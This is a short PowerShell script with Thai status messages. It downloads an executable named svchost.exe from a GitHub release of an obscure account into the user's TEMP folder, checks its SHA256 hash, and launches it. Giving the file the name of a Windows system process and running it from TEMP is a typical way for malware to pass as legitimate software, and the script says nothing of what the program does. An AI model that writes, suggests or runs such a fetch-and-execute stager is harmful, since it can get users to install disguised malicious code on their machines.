$downloadUrl = "https://github.com/jumpbubooppxx-cloud/svhost/releases/download/v1.0.0/svchost.exe"
$expectedHash = "52ee0e81d44c6512360a1c6d9620c5a942c76719423410fdbf2d3ed0acf541ac"
$destPath = "$env:TEMP\svchost.exe"

Write-Host "กำลังดาวน์โหลด svchost.exe..." -ForegroundColor Cyan
Invoke-WebRequest -Uri $downloadUrl -OutFile $destPath -UseBasicParsing

$actualHash = (Get-FileHash -Path $destPath -Algorithm SHA256).Hash

if ($actualHash -ieq $expectedHash) {
    Write-Host "ตรวจสอบความสมบูรณ์ของไฟล์สำเร็จ (Hash ตรงกัน)" -ForegroundColor Green
    Start-Process -FilePath $destPath
} else {
    Write-Host "คำเตือน: Hash ไม่ตรงกัน! ไฟล์อาจไม่สมบูรณ์หรือถูกแก้ไข" -ForegroundColor Red
    Remove-Item -Path $destPath -Force
}
